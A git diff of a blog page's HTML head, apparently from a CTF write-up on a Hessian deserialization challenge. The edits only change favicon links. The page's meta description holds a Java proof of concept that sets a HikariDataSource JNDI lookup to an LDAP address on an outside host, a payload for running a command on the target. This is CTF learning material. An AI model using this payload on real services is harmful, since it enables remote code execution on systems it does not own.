@@ -8,9 +8,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="author" content="Snakinya" />
   <meta property="og:url" content="http://www.snakin.top/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99/" />
-  <link rel="canonical" href="http://www.snakin.top/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99/" /><link rel="apple-touch-icon" href="favicon.ico" />
-  <link rel="icon" href="favicon.ico" />
-  <link rel="shortcut" href="favicon.ico" /><link rel="alternate" type="application/atom+xml" href="http://www.snakin.top/index.xml" title="Snakinya">
+  <link rel="canonical" href="http://www.snakin.top/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99/" /><link rel="apple-touch-icon" href="http://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="http://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="http://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="http://www.snakin.top/index.xml" title="Snakinya">
 
   <script type="application/ld+json">
   {
@@ -54,7 +54,7 @@ POC构造 import com.alibaba.com.caucho.hessian.io.Hessian2Input; import com.ctf
 漏洞点在：com.alibaba.com.caucho.hessian.io.Hessian2Input#expect
 对象和string拼接就可以触发tostring
 POC构造 import com.alibaba.com.caucho.hessian.io.Hessian2Input; import com.ctf.badbean.bean.MyBean; import java.io.*; import java.util.Base64; public class payload { public static void main(String[] args) throws IOException { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HikariDataSource ds = new HikariDataSource(); ds.setDataSourceJNDI(&amp;#34;ldap://1.117.171.248:9996/Basic/Command/calc&amp;#34;); Hessian2Output out = new Hessian2Output(byteArrayOutputStream); Object o = new MyBean(&amp;#34;&amp;#34;, &amp;#34;&amp;#34;, ds, HikariDataSource.class); out.writeString(&amp;#34;aaa&amp;#34;); out.writeObject(o); out.flushBuffer(); System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream." />
-  <meta property="og:locale" content="cn" /><meta property="og:image" content="favicon.ico" />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="http://www.snakin.top/favicon.ico" />
   
 
   
